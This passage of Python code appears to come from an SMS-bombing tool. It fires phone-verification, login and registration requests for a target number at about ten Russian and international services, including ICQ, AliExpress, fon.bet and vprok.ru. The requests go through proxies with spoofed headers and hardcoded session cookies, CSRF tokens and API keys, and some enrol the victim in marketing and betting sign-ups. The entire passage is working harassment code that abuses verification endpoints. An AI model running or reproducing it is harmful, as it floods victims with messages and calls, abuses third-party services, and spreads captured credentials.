U0RCeFdsSXpjM1ZIUjBWak4ySTBVRmxJWjNaaksydE5hVU41U0ZFemFWWnVRemxGVFhkNFJHdDZVMmM0ZEZocWVHZENlbnB3YjFJelNscFhRM2hsWkZZMGNUWjNlak15TkVoUmNtVnFjbWN3YWs0eWFYaDRlWHBsWlRBM1VsTXdTMnBzTVRkbmNVNDJkM0ZWVVM5V1V6VTNNM1JTZUdwS1JYVjVOV2RZWlc1WU5VRlFjRFpZYmxaWldUa3JXRTVxZUd4bFozVXZZVTB2Y1V4UU9Xb3ZjMHQxSzA5WWFrOUdTemxKUTBnM05EZHJjRWN5TTJreFkxcExRVzg0V21neWNsVnJhblpzUTA1cmVsUnBRV3QzTXpabk55ODJVWE01YXpaU1IwNXNjM0ZWTldwS1drcHhMMVF5ZEVwVk9WRnJlRzFoTUdzMFlXdHliR2Q1UkZGVVZtaHBlV1ZFV1ZWVGNYSkhUM0oxY1haYU1TOXRNbEJuVGpkV01FVXZOMjFaYUdGelNESnVTR2RpVTBsamVXcFdhVmQwVW5KUlFtbFVjVzlVZW05blpUbFFjMFpwTlhCUVFubEdUVFpOVDFWNFRuRnFWV2xOUkdKT00wTlFWRVpyWTNBNE5FTkpaV1pNTm1Kck5FSjZZM29yU21OdFNqSm9jV3RrZFRoSU5UWjNWRmRJUjNWUE1uUlFkWFJGWW1KTU9FdHVXRmh0TlRWNlUwbHJUVXB3YTBGeFRGZ3JSV3cwYkZwSFNETTRTM05qY0RFd09DczJNV2RpU2tGRFoyWkNWa2hXYURkbFRqUkpUbEpUVEdVeGIyWjZPWFZHWlhkV1drSXpZa05oUTBkMGRuUm1Ta1pHVUhwWFluWm9NM0ZqSzNWYWEzbHBOR056WTBsT2QzSndRMVJZY2sxR05XaGhiVXBOTm0xd1NEWTVkRzB2V0had1NVZG9aWEF3VFhCcGNHVkxXREV5VDFCM09ERjFjRU5YVDJSMU4wbHlabk5wUW1waVFrUkdOMHBxY0dkaVowOTVkMUZaWTFSeWVFODFTWGhzZFRkWWNVOUVjbEpLYVRSalZUTnJOM3AyVjJSTlpVNDVjV1pTU0hkeVowSk1PR3MyVUhCYU5DOXpjSFJ3TXpJNVEzVXZLM2hIVUdjemJtdFhXV3RSZFd4SmRWRlZUV3hSUTI5UVkxQlhNV3Q2WVVsRGNrVnllVGhEVkRSUVZsaGxWa2xYVEhrNWRHWjRaak5KVkdoTFpERm9NV2hGWWpsVFNtaHljRVY1TVhGaGVIVTJaeXRqZG1WQmQwRm1SVUpvZVhoTk9XeFZVMWhFUnpadlEwcDFOblJUZERWNVVGaERNRWhoYURFNGRUTXJVRFE1VEV4UmNGQkNUeXRtVkdwbVdVSjRVM1ZyZHpKc2FUTlRUbXhESzNsRlJFNUZNbmswTDJZd1dIY3dSMG8wWVdOYVFrNDNkVXhTVFdOb01YcG1NWGgwTkRGWE9WUm9iM3BtWTNKNlRucHVXRGRsY3k5dmRGaDJTM0ZMWm1OR2NHRlZNVWxSZEU1M1VXNVdjbTF5Um5wbFJuUmlkbFJZTjBkRFFrdFRVRUpyUVUxVVJuRktOR1ZOVTNoM2NrZG1kMGRUVUdSTGFDdEpWSFpXVEV4RFEwdEdhR04yZVhwWVpXOXJTWEUyTmpKd1JVbENlQ3Q2T0hwdmNHVjVhVUYyVURFek55czJSSFJSTlZwYWNISlpSbEFpTENKbGVIQWlPakUyTmpnd01qazBORFlzSW5Ob1lYSmtYMmxrSWpvek16azFNVEF6TURNc0luQmtJam93ZlEuaEQ4RHIzRFRxenRZb3JzNTQ0ZjJRQzVsQ0V6LVY1WkhDeWZJNFFtcmdpbyJ9'
            }

            payload = {
                'app_id': "55e085968a5da59241000001",
                'phone': "+" + number
            }

            requests.post('https://api.wheely.com/v6/auth/oauth/token', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '141',
                'content-type': 'application/json',
                'origin': 'https://web.icq.com',
                'referer': 'https://web.icq.com/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user
            }

            payload = {"reqId": "85231-1668029727",
                       "params": {"phone": number, "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r",
                                  "application": "icq"}}

            requests.post('https://u.icq.net/api/v89/rapi/auth/sendCode', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '71',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'ipp_sign=5a947322571700607a6fdc9b442ed5ac_1654813222_82ffab69c395f4ad2da558cdfc61827d; ipp_uid=1668029836579/jPu0X4dc1c2AUqN6/qggNplKjJqoPzjoIWEfthw==; rerf=AAAAAGNsHY13FjLPA3UPAg==; PHPSESSID=Veo22h717LnuuorrRJKPL3GgrV1uvHwc; BITRIX_SM_SALE_UID=1526051370; flomni_630671829fa868097f1947da={%22userHash%22:%220b9d6713-5020-4333-88a8-44b6918de625%22}; BX_USER_ID=c35d2e5e5e9270c5b3d377e92deb5871; user_usee=a%3A0%3A%7B%7D; user_city=%D0%9A%D0%B0%D0%B7%D0%B0%D0%BD%D1%8C; ssaid=c3a548b0-6076-11ed-989f-73533c479965; __tld__=null; _gid=GA1.2.378970155.1668029873; adtech_uid=2b8530d4-7f26-4637-ae7c-24e4d7ed7efc%3Are-store.ru; top100_id=t1.7445697.1906969986.1668029873353; last_visit=1668026273358%3A%3A1668029873358; _ga_WX7VG3P9BH=GS1.1.1668029873.1.0.1668029873.0.0.0; _ga=GA1.1.1964199913.1668029873; _gat_ddl=1; _gat_ddl2=1; _gcl_au=1.1.149357349.1668029874; t3_sid_7445697=s1.1853777416.1668029873356.1668029873981.1.2; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _gp10002521={"hits":1,"vc":1}; _gpVisits={"isFirstVisitDomain":true,"todayD":"Wed%20Nov%2009%202022","idContainer":"10002521"}; ipp_key=v1668029858017/v33947245ba5adc7a72e273/HKMpCGu1Mw6dnlzPeRqtpA==; ipp_static_key=1668029858090/PY5IN4TrLEN1V172HnyLsg==; cto_bundle=JlrSOV9WODgyWEJ4OWt2V2NrODdsSDV0R3RYQVhRUENadmZHJTJCc081YTdCd0hESkRJMEtxNk1qSWtONyUyRk04JTJGcmxPV2FTRSUyRnV4Q09RdTV6QW5CUktZVjBCZ1RGamgxV2RaSW5ZeFBBamdYZTVObzNzQ0JLSkxkdU51QjFjRXNMN3FjNmVVOFFDRU90YTZTRSUyRkN0clVHOUNpWlhnJTNEJTNE',
                'Host': 're-store.ru',
                'Origin': 'https://re-store.ru',
                'Referer': 'https://re-store.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                'action': 'code_sms',
                'PERSONAL_PHONE': num2,
                'PERSONAL_EMAIL': ''
            }

            requests.post('https://re-store.ru/local/components/multisite/system.auth.sms/ajax.php', data=payload,
                          headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '231',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': 'uid=UbGokWNsHtsam06bAwXMAg==; .ASPXANONYMOUS=aLtF3Euak0aI0S9e42PDHw; _SL_=6.83.; _ipl=6.83.; __utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); __utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); AB_CREDITSELECTION=Test_000195_A; AB_CREDITSELECTION_DIRECT=never; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8GIymPxtm1FFmKVQVGA7i3eSw5EuDlEAI6yoUR-lLFuhs6PZSKZSYC69yd-ImQtg7VMTVs-YREVxcAm9pTBRdll6qirhjMSoXp20s8hxsTbAL6O3BZFBlhYZ_8Nf00Qvpcpt1dmrE5oyGos4nyJcoes; __cf_bm=ZjbtEUV9dl1mEJNlE4WHlqfswV2gFvh28__bRnhiZbc-1668030211-0-AUO7xru8loJtNzO2Ffv6rNJrjJnYGpb5KYOMSIokmdlEk8VF/XY1xx/aKWrJWuHqh1Bqhq8nPhFdWeylZhzgjy1pKA+V7XExgqMhepF+s63F; _cfuvid=VvENPoiZRWhMICqFKfY413RVyf_TwT4WmJFCPZPVJiM-1668030211698-0-604800000',
                'origin': 'https://my.sravni.ru',
                'referer': 'https://my.sravni.ru/signin?ReturnUrl=%2Fuser%2Fprofile',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {
                '__RequestVerificationToken': 'CfDJ8GIymPxtm1FFmKVQVGA7i3c6GdbFf41SftrzCGJ0NjJWXj04eT9whWjnEE37nwuELHlp42n3cj3_8E36WbypiKwpbcwu7ykP40eOWeONUwI7q_hRaxaTJ2pIqKFx5bB3tWc72gaHTsA2npAdpsIh2OA',
                'phone': '+' + number,
                'returnUrl': '/user/profile'
            }

            requests.post('https://my.sravni.ru/signin/code', data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '17',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'region=1; deliveryTypeId=1; standardShopId=2527; luuid=73c0fa54-2927-4afa-a372-6004f8647bb6; suuid=d739609b-436f-4502-a032-67dba9fdc97e; XSRF-TOKEN=eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9; access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5IiwianRpIjoidXVpZDczYzBmYTU0LTI5MjctNGFmYS1hMzcyLTYwMDRmODY0N2JiNjBmZDJlNzVkMjNlMDQ5MWQ4MGRkMTgzOGU0NmY1YWYwODliMTJhYWMiLCJpYXQiOjE2NjgwMzA1OTguMjU0ODMyLCJuYmYiOjE2NjgwMzA1OTguMjU0ODM0LCJleHAiOjE2NjgxMTY5OTguMjUxNTQsInN1YiI6IiIsInNjb3BlcyI6W10sInNwbGl0X3NlZ21lbnQiOjl9.B-C8hM2_ZfrY4QdYvmqbZQFgfUbcrOYb40F_5rpzUuS086BFGi1WelZVdavOhFeUKR7o8AT9rLKIQ7SvO_i4WwB1gJ7NCPwqNq8saUHSMIqoZruJiNPOTa_fyYAJGXaOLekVK984_84tohSyVPp6CgM1HtXD8lvKSD1tnDhtP7SjFaazKnD4YwkHeT0mJsi4smjX-XsMJN9Z3A2y5-0GT6HEol93jKlXNw3wsBR_7ZJ_vpIT9waE9w-tIs21HvCW6Ad6j5Okn0lO2MtYZ5KuP63UBFj3BERVx7GJTIRKbjFMzS6tb0jw1pQkMX_k86d181wsPZagCOW9cxSMpcxP1O8rDP_MVLk-Y53c3Ap3R-3EhdWYyex74Pua6ZOBerNu_Eg6wM2KcTQQOyOY3jdtQ5BUg7orMtkmxA5ua6NGlaJeNmDqbQDwsZSMF7kbpzI5YRjg8lSy6rUHUJQCHDKCSHaVCVnO65IjNru1qZ5B0AgWeNE85vf5EgDx5IvviHzVCz4QAkztlhqpebCZ4rM992-As26eSZZN_gYY1e38xehoXFwS1tDhWr5jWQMbgOlAfSj649353BXO-iPQ10_NS81g-1579ZxF6f9HtmuGe7gm_5WtNkEpH2SSDaVasXNo45Gh23DMWGLw1JA64LfU3RNlHMdoRDPfVfgRNzzG5rs; split_segment_amount=11; aid=eyJpdiI6InBvZnl6VVp2WWhMSUdGTXBpSEJZeHc9PSIsInZhbHVlIjoia0ZQSTd0RFwvTVRWV3I0M2ZyamZxN3N2R3d2Vmg2S0V4bGJBRWFlckY5YkZ4V0srWWhybzRDM3JYaVRQa0cwNzVsUWllSkZhSHhEWXE0bzlGQUxqc2p3PT0iLCJtYWMiOiIyYjUxOWEyYjU5MzAwNDcyMTRiMmQ3NmIzMWE1YjJkNzgyNzg0NGM5MDRlNzgxOWM4NGI1MWQ4OTdhZjYyZDJmIn0%3D',
                'origin': 'https://www.vprok.ru',
                'referer': 'https://www.vprok.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-xsrf-token': 'eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9'
            }

            payload = {
                'phone': number
            }

            requests.post('https://www.vprok.ru/as_send_pin', data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '402',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'JSESSIONID=43513EF03AC09ED7D6F2351E9E0F002C; JSESSIONID=43513EF03AC09ED7D6F2351E9E0F002C; pickupCity=true; cityCode=spb; lemurrr-cart=1b4bf0de-c776-4610-8307-6673951f2d1b',
                'Host': 'lemurrr.ru',
                'Origin': 'https://lemurrr.ru',
                'Referer': 'https://lemurrr.ru/registration-card',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                'step': '1',
                'pets': '',
                'phone': num2,
                'token': '',
                'lastName': '',
                'firstName': '',
                'patronymic': '',
                'email': '',
                'titleCode': '',
                'birthdayDate': '',
                'birthdayDateDate': '',
                'cityCode': '',
                'cityName': '',
                'password': '',
                'confirmPassword': '',
                'newsletterAgreement': 'on',
                'smsMarketing': 'on',
                'emailMarketing': 'on',
                'line1': '',
                'flat': '',
                'stage': '',
                'namePet': '',
                'typePet': '',
                'breedPet': '',
                'weightPet': '',
                'birthdayPet': '',
                'birthdayPetDate': '',
                'bonusCardsNumber': '',
                'promotionCode': '',
                'CSRFToken': '2b3c6379-ff43-46a9-9dac-3a4f5a47496a'
            }

            requests.post('https://lemurrr.ru/registration-card/registration', data=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ua': '223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==',
                'bx-umidtoken': 'T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=',
                'content-length': '1561',
                'content-type': 'text/plain;charset=UTF-8',
                'cookie': 'aer_abid=e7837ca8509e6c9a; acs_usuc_t=x_csrf=3gi48phl5j_s&acs_rt=7122813d0f5b49338fcecc4affd772da; xman_t=RYU45Rw/P4JNJF84NKgT4dq70sIp4TguFPGJj8BZOhkRd0TBje5c2RaODRkrwPhT; xman_f=5un0UFmYvrNgACLBAum4oWM8RAUqunUYiCgw4FGrjNzKARmwUxko2lpQqldFKK5Of1fWk0gHOItRELxCz/Cp/nIE6bPX4/Fo3fBI1z596wNChx5//UL6WQ==; xman_us_f=x_locale=ru_RU&x_l=0&x_c_chg=1&acs_rt=50c77cefad7a4021b41f0f6f2a9ced49; intl_locale=ru_RU; aep_usuc_f=site=rus&c_tp=RUB&region=RU&b_locale=ru_RU; xlly_s=1; intl_common_forever=UYSq6AZOhhaI4ZOz9j5s1/mt5Mkg2bUOF+BzgAF3t937OTKSMIfdaw==; JSESSIONID=44828D31960F5FA579B40154BB4ABEEC; tfstk=cl3CB9geNY3ayZYl-JOwU_f7xbahZx5bNHwnOptNgV0hxclCiSb4hNIrqTUzw51..; l=eBM9vtwITHaZfir8BO5ahurza77TmCOfcsPzaNbMiInca6nOaFiMWNCUvWrpudtjQt5jeEtyLtAZndny8SU3Wtw7VXuPMUGlifppRe1..; isg=BCUlHVXRqkixJ84UtWrpsDHoNOdfYtn0gFsUSCcP6txrPk2w47MwxZUYyLpIPvGs',
                'origin': 'https://aliexpress.ru',
                'referer': 'https://aliexpress.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-aer-cna': '-'
            }

            payload = {"phone": "7-" + number[1:], "locale": "ru_RU", "currency": "RUB",
                       "returnURL": "https://aliexpress.ru/", "channel": "CALL", "environment": {
                    "uaEncrpt": "223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==",
                    "umidToken": "T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=",
                    "regSrc": "AE_MAIN_LOGIN", "securityTimestamp": 1668031201204, "refer": "https://aliexpress.ru/",
                    "userAgent": user}}

            requests.post('https://aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init?_bx-v=2.0.52',
                          json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '407',
                'Content-Type': 'text/plain;charset=UTF-8',
                'Host': 'clientsapi03w.bk6bba-resources.com',
                'Origin': 'https://www.fon.bet',
                'Referer': 'https://www.fon.bet/account/registration/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': user
            }

            payload = {
                "advertInfo": "",
                "birthday": "2000-10-25",
                "deviceId": "2340BBFFD39BD54C3A914A90D5582A63",
                "ecupis": True,
                "email": "",
                "emailAdvertAccepted": True,
                "fio": "",
                "lang": "ru",
                "password": "Hoho_HO123",
                "phoneNumber": "+" + number,
                "platformInfo": user,
                "promoId": "",
                "sysId": 1,
                "webReferrer": "https://www.fon.bet/"
            }

            requests.post('https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess',
                          json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '29',
                'content-type': 'application/json',
                'origin': 'https://www.myacuvue.acuvue.ru',
                'referer': 'https://www.myacuvue.acuvue.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
                'x-api-key': 'XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu',
                'x-app-version': 'PWA 2.3.1'
            }

            payload = {
                'phoneNumber': number
            }

            requests.post('https://api.myacuvuepro.ru/myacuvue/oauth/mobile', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            num2 = f"+7 ({number[1:4]}) {number[4:7]}-{number[7:]}"

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'content-length': '96',
                'content-type': 'application/json',
                'cookie': '__ddg1_=yQBvT8ysH0tFlugWm0O9; carrotquest_device_guid=ace92f79-95eb-40a9-9b46-d06ef787dcb3; carrotquest_uid=1310692300824775160; carrotquest_auth_token=user.1310692300824775160.47112-01b222b73dc258e08f5f0e0bdc.57ce2ff07ad4234296e3a0e39d501b1fe0645cb1965dcca9; carrotquest_realtime_services_transport=wss; referral_sesid=1668354697.RqGoIa; carrotquest_session=8dvqbuyatub1foysktrtghhna4pd7v1f; carrotquest_session_started=1',
                'origin': 'https://firstvds.ru',
                'referer': 'https://firstvds.ru/',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-kl-ajax-request': 'Ajax_Request'
            }

            payload = {"phone_formated": num2, "auth": "6d122a698ceb27bd5be268f4", "type": "start",
                       "code": ""}

            requests.post('https://firstvds.ru/my/number_check', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
